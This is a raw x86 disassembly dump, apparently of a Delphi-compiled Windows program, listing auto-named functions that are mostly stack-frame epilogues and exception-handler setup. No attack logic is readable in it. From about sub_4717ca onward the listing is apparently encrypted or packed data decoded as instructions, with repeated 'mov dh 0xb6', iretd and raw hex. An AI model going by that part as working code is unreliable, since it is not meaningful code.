jmp sub_4036f0
sub_4664ca
add [ eax ] eax
add [ eax ] al
int3
sub_466521
jmp sub_403878
sub_466528
pop ebp
retn
sub_46652c
sub [ rw-data ] 0x1
retn
sub_466b80
jmp sub_403878
sub_466b87
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466ba4
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_466b9d
jmp sub_403878
sub_466ba4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466c70
jmp sub_403878
sub_466c77
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466e28
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_466ec1
jmp sub_403878
sub_466ec8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466f26
jmp sub_403878
sub_466f2d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4671cc
jmp sub_403878
sub_4671d3
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4673fe
jmp sub_403878
sub_467405
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_467492
jmp sub_403878
sub_467499
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467518
mov ecx edx
mov [ eax + 0x78 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_41ab4c
sub_467729
jmp sub_403878
sub_4677a8
jmp sub_403878
sub_4677af
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46787d
jmp sub_403878
sub_4678da
jmp sub_403878
sub_4678e1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467968
jmp sub_403878
sub_46796f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467aba
jmp sub_403878
sub_467ac1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467ae0
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_467ad9
jmp sub_403878
sub_467ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467afd
lea eax [ ebp - 0x14 ]
call sub_403ef8
retn
sub_467af6
jmp sub_403878
sub_467afd
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_467bc0
mov eax [ eax + 0xb0 ]
call sub_416d70
retn
sub_467bcc
push ebx
push 0x0
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_467caa
jmp sub_403878
sub_467cb1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467d8d
jmp sub_403878
sub_467d94
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467ee6
jmp sub_403878
sub_467eed
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467f17
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f1c
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_467f10
jmp sub_403878
sub_467f17
pop ebx
mov esp ebp
pop ebp
retn
sub_467f1f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x33 ] dl
ror [ ebx + 0x3453ff18 ] cl
pop ebx
retn
sub_467f34
push ebx
mov ebx eax
mov eax ebx
call sub_416d70
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
sub_46801c
jmp sub_403878
sub_468023
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46802c
mov edx [ eax + 0x4 ]
add edx [ eax + 0x24 ]
mov eax edx
retn
sub_468124
jmp sub_403878
sub_46812b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46818d
jmp sub_403878
sub_468194
pop ebp
retn
sub_468198
sub [ rw-data ] 0x1
retn
sub_4684cf
jmp sub_4035c4
sub_4684fc
jmp sub_403878
sub_468503
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468552
jmp sub_403878
sub_468559
pop ebx
pop ecx
pop ebp
retn
sub_4685c8
push ebx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4685e8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0xc8 ]
mov edx esi
call sub_403f4c
pop esi
pop ebx
retn
sub_468600
mov [ eax + 0xdc ] edx
retn
sub_46862d
jmp sub_403878
sub_468634
pop ebp
retn
sub_468638
sub [ rw-data ] 0x1
retn
sub_468882
jmp sub_403878
sub_468889
pop ebx
pop ecx
pop ebp
retn
sub_468890
retn
sub_468894
retn
sub_468898
retn
sub_46889c
retn
sub_468967
jmp sub_403878
sub_46896e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_468984
jmp sub_403878
sub_4689ae
jmp sub_403878
sub_4689b5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036f0#8
jmp sub_4036f0
sub_4689c4
add [ eax ] eax
add [ eax ] al
int3
j_sub_4035c4
jmp sub_4035c4
sub_468b32
jmp sub_403878
sub_468b39
pop ecx
pop ebp
retn
sub_468b9a
jmp sub_403878
sub_468ba1
pop ecx
pop ebp
retn
sub_468c07
jmp sub_403878
sub_468c1c
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_468c30
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_468c48
mov [ eax + 0x49 ] 0x1
call sub_41a9d0
retn
sub_468c54
add eax 0x40
call sub_40d1c0
retn
sub_468c60
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a8fc
pop ebp
retn 0x8
sub_468c99
jmp sub_403878
sub_468ca0
pop ebp
retn
sub_468ca4
sub [ rw-data ] 0x1
retn
sub_46aeb9
jmp sub_403878
sub_46aec0
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_46b029
jmp sub_403878
sub_46b030
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46b0ee
jmp sub_403878
sub_46b0f5
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b158
jmp sub_403878
sub_46b15f
mov eax esi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46b22a
jmp sub_403878
sub_46b231
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_46b2ef
jmp sub_403878
sub_46b2f6
pop ebx
pop ecx
pop ebp
retn
sub_46b3b3
jmp sub_403878
sub_46b3ba
pop ebx
pop ecx
pop ebp
retn
sub_46b506
jmp sub_403878
sub_46b50d
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b5a3
jmp sub_403878
sub_46b5aa
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b779
jmp sub_403878
sub_46b780
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46b975
jmp sub_403878
sub_46b97c
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46b9dc
jmp sub_403878
sub_46b9e3
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ba5a
jmp sub_403878
sub_46ba61
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46bac4
jmp sub_403878
sub_46bacb
mov eax esi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46bb56
jmp sub_403878
sub_46bb5d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46be0d
jmp sub_403878
sub_46be14
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_46bebc
call sub_41aecc
retn
j_sub_4036f0
jmp sub_4036f0
sub_46c182
jmp sub_403878
sub_46c189
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c2f7
jmp sub_403878
sub_46c2fe
pop ebx
mov esp ebp
pop ebp
retn
sub_46c391
jmp sub_403878
sub_46c398
pop ebx
mov esp ebp
pop ebp
retn
sub_46c44c
jmp sub_403878
sub_46c453
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46c53d
jmp sub_403878
sub_46c544
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46c640
jmp sub_403878
sub_46c647
pop ebx
mov esp ebp
pop ebp
retn
sub_46c6b0
jmp sub_403878
sub_46c6b7
pop ebx
pop ecx
pop ebp
retn
sub_46c710
jmp sub_403878
sub_46c717
pop ebx
pop ecx
pop ebp
retn
sub_46c770
jmp sub_403878
sub_46c777
pop ebx
pop ecx
pop ebp
retn
sub_46c7d0
jmp sub_403878
sub_46c7d7
pop ebx
pop ecx
pop ebp
retn
sub_46c808
mov eax [ eax + 0x108 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46cb1f
jmp sub_403878
sub_46cb26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f85f
[ eax + eax ]
sub_46fa2d
jmp sub_403878
sub_46fa34
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46fa95
jmp sub_403878
sub_46fa9c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403878#9
jmp sub_403878
sub_46fd18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403878#8
jmp sub_403878
sub_4702d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403878#7
jmp sub_403878
sub_470481
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47097b
jmp sub_403878
sub_470982
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403878#6
jmp sub_403878
sub_470b54
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403878#5
jmp sub_403878
sub_470bd2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_470c86
jmp sub_403878
sub_470c8d
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403878#4
jmp sub_403878
sub_470ee5
pop ebp
retn
sub_470ee8
sub [ rw-data ] 0x1
retn
sub_4711b2
jmp sub_403878
sub_4711b9
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4711f1
jmp sub_403878
sub_4711f8
pop ebp
retn
sub_4711fc
sub [ rw-data ] 0x1
retn
sub_4717ca
insd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
iretd
sub_471835
push es
push ss
mov dh 0xb6
sub [ ecx + 0x24e7a537 ] edx
iretd
sub_4718ac
comiss xmm4 [ esi ]
mov dh 0xb6
mov dh 0x25
arpl [ esi ] bp
iretd
sub_471905
mov ecx 0xb6262668
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ edx + 0x2626062d ] esp
iretd
sub_47193d
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
imul eax edx 0xffffffab
arpl dx sp
iretd
sub_47194a
cdq
add eax 0xb6b62626
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ edx + 0x26262721 ] esp
iretd
sub_471961
daa
sub ah [ esi ]
mov dh 0xb6
movsd [ edi ] [ esi ]
out 0x24 eax
iretd
sub_471ae5
mov [ ecx ] edi
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
0xd1262609 0x3dfe
sub_471b6c
and al 0x43
iretd
sub_471b6f
mov al 0x2e
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
movsd [ edi ] [ esi ]
in al 0x6
iretd
sub_471b7f
[ edi ]
sub_471b81
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov eax [ 0xffffffffd9d9d9d6 ]
iretd
sub_471b8f
into
fstpnce st1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
pop ebx
0x38cf
sub_471ba2
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x3a ]
jne r-xdata
fstpnce st1
iretd
push ebx
into
iretd
sub_471c41
leave
fcomp st1
fnstenv [ esi - 0x4949494a ]
scasd [ edi ]
pushad
push ss
into
out dx al
sub esp [ esi ]
iretd
sub_471c53
mov edx 0xb626261b
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x4c
bound eax [ eax - 0x51 ]
arpl si bx
stosd [ edi ]
arpl [ edx - 0x61318990 ] sp
arpl [ esi ] sp
iretd
sub_471cf0
in al 0x6c
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xe8cf
sub_471d0c
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
iretd
sub_471d62
0xb6262621 0xb6b6
sub_471d79
iretd
sub_471db5
imul ebx esp 0xffffffd9
fnstenv [ esi - 0x35528c4a ]
cmpsd [ esi ] [ edi ]
0x2f72
sub_471dd6
cmc
xor [ esi ] esp
lodsd [ es : esi ]
out 0x40 eax
scasd [ edi ]
arpl dx si
jle r-xdata
iretd
push ebp
iretd
sub_471e2f
adc cl dl
fstpnce st1
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcaa5
sub_471e5b
mov [ 0x29262620 ] eax
mov [ 0x26266bea ] eax
iretd
sub_471f06
mov [ 0xffffffffe8a229d9 ] eax
mov [ es : 0xffffffffe0a229fd ] eax
movsd [ edi ] es : [ esi ]
inc ebx
fisub [ esi ]
iretd
sub_471f1b
and [ esi ] ah
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl dx bx
jbe r-xdata
lodsd [ ss : esi ]
int1
iretd
sub_471f3f

iretd
sub_471f44
adc eax 0xb6262614
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
mov dh 0xa6
lodsd [ es : esi ]
fisub [ ebx - 0x305dd627 ]
iretd
sub_471fdc
fild [ esi ]
mov dh 0xb6
mov dh 0xd9
push ebx
cli
fnstenv [ ecx + 0x7a ]
iretd
sub_471fea
push cs
xor [ esi ] esp
sub [ es : ebx + 0x262601ea ] esp
iretd
sub_472030
add eax 0xb6b62626
mov dh 0x75
iretd
sub_472059
in eax 0x3f
fnstenv [ es : ecx + 0x262626ce ]
stosd [ edi ]
arpl si sp
iretd
sub_472067
rcr [ esi ] 0x1
mov dh 0xad
fmulp st7
aad 0x20
mov dh 0xb6
sub [ ebx + 0x26261efd ] esp
iretd
sub_4720ad
inc ebx
fisub [ esi ]
iretd
sub_4720b6
inc edx
add dh [ edx ]
iretd
sub_47211c
iretd
sub_47228e
push 0xce262627
add [ 0xffffffffe2a52626 ] 0x36
iretd
sub_47229b
mov dl 0xa
mov dh 0xb6
mov dh 0xad
out dx al
iretd
sub_4722b9
xor [ edx ] ecx
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x78
inc eax
scasd [ edi ]
arpl dx dx
iretd
sub_47230c
xchg esi eax
fcmovnu st1
fxch st7
test eax 0xb6262664
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
iretd
sub_472323
outsd
or eax 0xe6a32626
iretd
sub_47232b
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
iretd
sub_472335
mov eax [ 0xffffffffb6262622 ]
mov dh 0xa5
out 0x24 eax
iretd
sub_47234c
sbb esp [ ecx ]
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcaa5
sub_472361
iretd
sub_472362
scasd [ edi ]
push ss
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0x26261688 ] eax
iretd
sub_472377
rcr cl 0x1
fldcw [ ecx ]
nop
and ch [ eax ]
sub [ eax - 0x301ef224 ] edx
mov al 0x9
mov dh 0x15
out 0x66 al
iretd
j_sub_472361
jmp sub_472361
sub_47243e
mov dh 0x29
mov bl 0xe7
lodsd [ esi ]
fild [ ebx - 0x26241155 ]
fxch st6
sbb al 0x7
iretd
sub_4724fa
mov esp 0x1526262e
out 0x4c al
or [ eax - 0x51 ] al
arpl [ esi + edi * 2 ] si
dec esp
push eax
iretd
sub_472552
fnsave [ 0xffffffffb6b62626 ]
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
xor dl [ edi - 0x31 ]
int1
or ah [ esi ]
mov dh 0x71
iretd
sub_4725d0
shr [ 0xffffffffafb62626 ] 0x60
adc cl [ esi - 0x7c ]
add [ edi - 0x33 ] 0x71
into
adc [ edx ] esp
dec esi
imul eax [ edx + 0x4 ] 0x1e60af71
into
mov cr4 esi
iretd
sub_47266e
dec edi
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x4e
and al 0x26
iretd
sub_4726d4
sti
add ah [ esi ]
mov dh 0xb6
mov dh 0x4c
daa
stosd [ edi ]
bound eax [ edx ]
or [ esi - 0x55 ] esi
mov [ 0x2626be02 ] al
iretd
sub_4726ea
lodsd [ esi ]
and ah [ esi ]
mov dh 0xad
arpl dx bx
iretd
sub_4726f4
and esp [ esi ]
mov dh 0x73
lodsd [ esi ]
0xcaa5
sub_472710
mov dl 0x0
mov dh 0x73
lodsd [ esi ]
0xcaa5
sub_472764
fstpnce st1
iretd
sub_4727ce
xchg esp eax
adc [ esi ] esp
mov dh 0xad
stc
iretd
sub_4729fc
mov eax 0x4e262624
push ss
iretd
sub_472bda
fstpnce st1
mov dh 0xb6
mov dh 0xb6
movsd [ edi ] [ esi ]
inc ebx
fisub [ esi ]
iretd
sub_472c51
into
sahf
enter 0xd9d9 0xa3
out 0x29 al
mov [ 0xffffffffd9d9d594 ] al
adc eax 0xb6e5efe6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
fist [ edi ]
iretd
sub_472cbc
aad 0x35
adc eax 0x2a6b1fef
sub [ eax - 0x26262aa4 ] esp
jo r-xdata
arpl si bx
iretd
push ebx
iretd
sub_472cdc
pop es
fstpnce st1
fnstenv [ esi - 0x5835528d ]
0x2c42
sub_472cec
iretd
sub_472cf1
dec esi
push ss
iretd
sub_472cf7
sbb al 0xd1
fstpnce st1
mov dh 0x15
hlt
sub_472d27
outsb
xor ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcaa7
sub_472d94
mov bl 0xdf
fstpnce st1
fnstenv [ eax + 0x6a ]
iretd
sub_472e04
push ebp
sbb ah [ esi ]
mov dh 0xb6
sub [ edx + 0x26262f88 ] esp
dec esp
iretd
sub_472e3c
and al 0x26
stosd [ edi ]
mov [ 0xffffffffd9d9dbde ] eax
into
sub dl [ ebx ]
iretd
sub_472ec9
adc eax 0xb6262639
mov dh 0xa5
0x757e
sub_472ed3
adc eax 0x3378cfe6
adc eax 0x288bcfe6
movsd [ edi ] es : [ esi ]
pop ebx
sub [ es : edx - 0x2626375c ] esp
iretd
sub_472feb
push ss
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0x26262cf6 ] al
iretd
sub_473016
loop r-xdata
ror bh 0x1
mov bl 0x12
dec esp
mov [ 0x4aa229fd ] eax
lodsd [ es : esi ]
push 0x2
mov [ ss : 0x46a229ef ] eax
iretd
sub_47306c
fstp st1
iretd
sub_4730c9
cmp al 0x26
mov dh 0xb6
movsd [ edi ] [ esi ]
fcompp
iretd
sub_473104
fstpnce st1
mov dh 0xb6
mov dh 0xb6
cmpsd [ esi ] [ edi ]
0x2416
sub_47319a
dec esi
iretd
sub_47319c
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
arpl [ esi ] bp
iretd
sub_4731a7
0x2613
sub_4731b0
daa
iretd
sub_4732b9
pop esi
rcr ecx 0xd9
mov dh 0xab
mov [ 0xffffffffd9d9db7a ] eax
iretd
sub_4732c5
push 0xb6262608
mov dh 0xb6
stosd [ edi ]
arpl [ esi + 0x6dce63e1 ] cx
jo r-xdata
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0x9cf
insd
iretd
sub_473419
aaa
mov dh 0x71
cdq
or ah [ esi ]
iretd
sub_473447
pushad
xor cl dh
0x4ed9d9d3 0x5da2
sub_47347f
0xd926260a 0xea91
into
and esi [ edi ]
iretd
sub_473491
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
0x26cf
sub_4734a2
fnstenv [ esi + 0x8e1cf73 ]
iretd
sub_4734f9
iretd
sub_4734fa

sub_4734fb
add [ esi ] ah
iretd
sub_47353f
mov dh 0xb6
dec esi
shl [ edi ] cl
fnstenv [ es : ecx + 0x2e ]
fst [ edx + 0x2 ]
iretd
sub_473550
vpsubusw xmm3 xmm4 xmm1
mov dh 0xaf
arpl si bx
iretd
sub_47355b
mov dh 0xb6
mov dh 0xb6
fst [ edx + 0x2 ]
fnstenv [ eax + 0x52 ]
popad
fldcw [ edx + 0x2 ]
iretd
sub_47356e
push 0x26
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
arpl sp bx
iretd
sub_47359a
retn 0x2624
sub_47359d
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
iretd
sub_4735af
rcr ecx cl
fxch st7
push cs
retn 0xd9d9
sub_4735de
lodsd [ esi ]
fcompp
mov cl 0x8e
iretd
sub_4735f1
fstpnce st1
iretd
sub_47362a
mov [ ebx ] 0x26
mov dh 0xad
fisub [ 0xffffffffcf77da63 ]
ud2
sub_473674
xor esp [ 0xffffffffb6b62626 ]
mov dh 0xce
and edx [ edx ]
iretd
sub_4736bd
fstpnce st1
mov dh 0xb6
mov [ 0xffffffffb2a329ef ] eax
pop es
iretd
sub_4737eb
fstpnce st1
fnstenv [ esi + 0x3dcf664c ]
cmp [ esi ] esp
mov dh 0xce
int1
fcmovnu st1
fnstcw [ edi + 0x7f ]
iretd
sub_4737ff
test [ edx ] edi
mov dh 0xb6
mov dh 0x40
mov [ 0xfa7cfd0 ] eax
mov dh 0xcf
into
rcr cl cl
fnstenv [ esi + 0x76b6b6b6 ]
iretd
sub_47381a
mov esp 0xadd9d9da
imul ebp [ esi ] 0xffffffad
arpl dx bx
iretd
sub_473825
or al 0x3c
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x75
fst [ ebx - 0x3e ]
iretd
sub_473837
fstpnce st1
mov dh 0xb6
mov dh 0x73
iretd
sub_47383e
sbb [ eax ] esi
adc eax 0xd96175d9
mov al 0x8a
iretd
sub_47384d
insb
or eax 0xb6b62626
mov dh 0xb6
mov dh 0xb6
fldenv [ ebx - 0x22 ]
iretd
sub_4738a2
fstpnce st1
lodsd [ esi ]
out dx al
iretd
sub_473978
fstpnce st1
cmpsd [ esi ] [ edi ]
0x2236
sub_473a4c
int 0xd9
fnstenv [ ecx - 0x31 ]
add ebx edx
fstpnce st1
iretd
sub_473abb
dec edi
and [ esi ] ah
mov dh 0x29
mov [ 0xffffffffd9d9d1f5 ] al
iretd
sub_473ac8
retn
sub_473b07

sub_473b0f
dec esp
inc edx
inc eax
scasd [ edi ]
arpl si cx
iretd
sub_473b16
sbb dh [ edi ]
mov dh 0xad
int1
iretd
sub_473b1e
retn 0xd9da
sub_473b21
fnstenv [ esi - 0x4949494a ]
sub [ edi + 0x26263eb4 ] ebp
iretd
sub_473b89
sahf
cmp esp [ esi ]
fnstenv [ es : eax + 0x26262692 ]
jns r-xdata
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x2626253d ] esp
iretd
iretd
sub_473bc9
cmp eax 0xe5ef66e6
mov dh 0x29
movsd [ edi ] [ esi ]
sbb al [ ebx ]
lodsd [ es : esi ]
imul ebx edx 0xffffffa5
out 0x32 eax
iretd
sub_473c05
push ebx
0xd9d9
sub_473c09
mov dh 0xb6
mov dh 0xcf
outsd
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9dac3 ] al
iretd
sub_473c4c
sub [ es : edx - 0x262627af ] esp
iretd
sub_473c55
or al 0x27
mov dh 0x73
iretd
sub_473c72
fcomp st1
fnstenv [ esi + 0x29b6b6b6 ]
mov [ 0x26262e57 ] al
iretd
sub_473c96
fstpnce st1
iretd
sub_473cc6
sahf
cmp [ esi ] esp
into
push es
iretd
sub_473cf0
mov [ ecx ] eax
mov dh 0xab
imul eax esi 0x77
fst [ esi - 0x26 ]
lodsd [ esi ]
iretd
sub_473d82
mov dh 0xad
pushad
adc bl cl
push ebx
fmulp st7
dec [ esi ]
stosd [ edi ]
jl r-xdata
iretd
sub_473d92
dec esi
xor ah [ esi ]
mov dh 0x29
mov [ 0x26260319 ] al
into
lds ecx [ edx ]
lodsd [ es : esi ]
salc
mov [ 0x16a229d0 ] eax
add esp [ esi ]
iretd
sub_473e6c
iretd
sub_473ec7
cmp al 0x26
mov dh 0xb6
dec esi
dec esi
scasd [ edi ]
add eax 0x26e291d9
iretd
sub_473efa
dec esi

sub_47402d
fxch st7
adc esp ebx
fstpnce st1
mov dh 0xb6
mov dh 0xb6
inc eax
movsd [ edi ] [ esi ]
pop ds
push es
iretd
sub_47403d
mov dh 0xd9
push ebx
fst [ cs : ebx - 0x26 ]
iretd
sub_474048
pop es
das
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x7f
iretd
sub_474057
pushad
or al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
movsd [ edi ] [ esi ]
sbb dh [ edi ]
iretd
sub_474097
or eax [ edi ]
iretd
sub_47409c
test al 0x37
mov dh 0xb6
mov dh 0xb6
fnstenv [ eax + 0x262626aa ]
mov [ 0xffffffffd598cfe6 ] eax
fstpnce st1
mov dh 0xb6
lodsd [ esi ]
imul ebp [ edx ] 0xffffffaf
daa
iretd
sub_4740df
adc eax 0xb626260d
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
inc esi
add al 0x26
iretd
sub_474122
cmpsd [ esi ] [ edi ]
sub [ esi ] ah
mov dh 0xb6
iretd
sub_474129
das
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
arpl [ esi ] bp
fnstenv [ esi + 0x42 ]
fst [ ebx - 0x26 ]
adc eax 0xd9dea5ef
sub [ ebx - 0x26285219 ] esi
cmc
iretd
sub_474163
add [ esi ] esi
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ ebx + 0x26262c96 ] esp
iretd
sub_474204
pop ss
and esp [ esi ]
mov dh 0xa5
pop edx
add al [ edx ]
sub [ es : edx - 0x26263fec ] esp
iretd
sub_4742c4
aam 0x2a
mov dh 0xb6
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
fcmovnu st1
fxch st7
fidiv [ 0xffffffffb6b62626 ]
mov dh 0xb6
dec esi
jmp r-xdata
sub_474303
salc
and [ esi ] esp
mov dh 0xb6
mov dh 0xb6
mov dh 0xe7
fidivr [ ecx ]
mov fs [ edi ]
iretd
sub_4743ac
das
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
arpl [ esi ] bp
iretd
sub_4743c4
retn 0xd9d4
sub_4743c7
fldenv [ edi + 0x26225aca ]
movsd [ edi ] es : [ esi ]
inc ebx
retn 0x7526
sub_474400

sub_474401
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebx + 0x2e ]
into
rol esp 0xd9
fnstcw [ edi + 0x7f ]
iretd
sub_474414
pop edx
aad 0xd9
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
iretd
sub_474428
mov dh 0x3a
mov dh 0xaf
jpo r-xdata
fst [ ebx - 0x2a ]
iretd
sub_47443a
scasd [ edi ]
arpl dx bx
iretd
sub_47443e
xor eax 0xb6d9d9d7
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
arpl si si
movsd [ edi ] [ esi ]
out 0x32 al
scasd [ edi ]
arpl si bx
iretd
sub_474451
int 0x38
